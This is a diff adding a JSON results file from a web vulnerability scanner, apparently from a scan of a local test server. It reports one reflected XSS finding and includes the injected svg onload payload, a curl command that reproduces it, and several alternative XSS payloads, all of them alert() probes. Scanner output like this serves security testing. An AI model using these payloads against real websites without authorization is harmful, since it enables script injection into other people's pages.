@@ -1,0 +1,81 @@
+{
+  "tool": "SV1",
+  "author": "ee.zvz",
+  "version": "1.3.0",
+  "meta": {
+    "target": "http://127.0.0.1:8099/xhr-post",
+    "crawl": false,
+    "depth": 0,
+    "scanners": [
+      "xss"
+    ],
+    "time_based": false,
+    "union": true,
+    "replay": true,
+    "browser": true,
+    "stored": false,
+    "hidden": false,
+    "js": false,
+    "external_js": false,
+    "har": false,
+    "request": false,
+    "data": false,
+    "json": false,
+    "second_order": false,
+    "dump": false,
+    "spa": true,
+    "openapi": false,
+    "blind": false,
+    "ssrf": false,
+    "oob": "",
+    "fail_on": "any",
+    "scope": "",
+    "db": "",
+    "sarif": "",
+    "retest": false
+  },
+  "stats": {
+    "pages": 1,
+    "points": 2,
+    "requests": 14,
+    "errors": 0,
+    "verified": 1,
+    "unverified": 0,
+    "fixed": 0,
+    "retest": false,
+    "duration_seconds": 4.27
+  },
+  "counts": {
+    "total": 1,
+    "by_severity": {
+      "MEDIUM": 1
+    },
+    "by_type": {
+      "XSS": 1
+    }
+  },
+  "findings": [
+    {
+      "kind": "XSS",
+      "severity": "MEDIUM",
+      "url": "http://127.0.0.1:8099/api/xhr",
+      "method": "POST",
+      "param": "user.name",
+      "payload": "<svg/onload=alert('sv106365d21')>sv106365d21",
+      "confidence": "MEDIUM",
+      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv106365d21')>sv106365d21</div></body></html>",
+      "technique": "reflected/text",
+      "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | browser proof unavailable for json inputs",
+      "artifact": "",
+      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv106365d21'\"'\"')>sv106365d21\"},\"q\":\"hello\"}' http://127.0.0.1:8099/api/xhr",
+      "data": {},
+      "alternatives": [
+        "<img src=x onerror=alert('sv106365d21')>sv106365d21",
+        "<script>alert('sv106365d21')</script>sv106365d21",
+        "sv106365d21\"><svg/onload=alert('sv106365d21')>",
+        "sv106365d21'><svg/onload=alert('sv106365d21')>",
+        "sv106365d21</title><svg/onload=alert('sv106365d21')>"
+      ]
+    }
+  ]
+}
